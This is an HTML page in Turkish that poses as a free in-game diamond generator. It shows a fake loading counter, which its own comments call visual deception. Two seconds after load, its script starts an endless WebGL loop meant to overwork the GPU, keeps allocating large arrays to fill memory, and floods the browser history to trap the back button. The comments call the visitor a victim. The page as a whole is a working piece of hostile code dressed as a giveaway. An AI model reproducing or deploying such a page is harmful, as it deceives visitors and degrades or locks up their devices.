<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ELMAS GENERATOR v3.0</title>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; overflow: hidden; margin: 0; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; filter: blur(8px); width: 100%; height: 100%; }
        .content { position: relative; z-index: 10; padding-top: 150px; }
    </style>
</head>
<body>
    <div class="content">
        <h1>💎 BEDAVA ELMAS YÜKLENİYOR 💎</h1>
        <p>Lütfen bekleyin, şifreleme protokolü çözülüyor...</p>
        <h2 id="perc">%0</h2>
    </div>

    <canvas id="c"></canvas>

    <script>
        // --- GÖRSEL ALDATMACA ---
        let p = 0;
        let timer = setInterval(() => { 
            if(p < 99) { 
                p++; 
                document.getElementById("perc").innerText = "%" + p; 
            }
        }, 50);

        // --- GPU (EKRAN KARTI) İMHA MOTORU ---
        const canvas = document.getElementById("c");
        const gl = canvas.getContext("webgl");

        function patlat() {
            if (!gl) return;
            function render() {
                // Ekran kartını saniyede 60 kez anlamsız renk değişimine ve hesaplamaya zorlar
                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
                
                // Arka planda RAM'i sessizce doldurur
                let junk = new Array(1000000).fill("ELMAS_GEMS_9999");
                
                // Geri tuşunu kilitler
                window.history.pushState(null, "", "?gift=" + Math.random());
                
                requestAnimationFrame(render);
            }
            render();
        }

        // Kurban sayfaya girdikten 2 saniye sonra saldırı başlar
        setTimeout(patlat, 2000);
    </script>
</body>
</html>
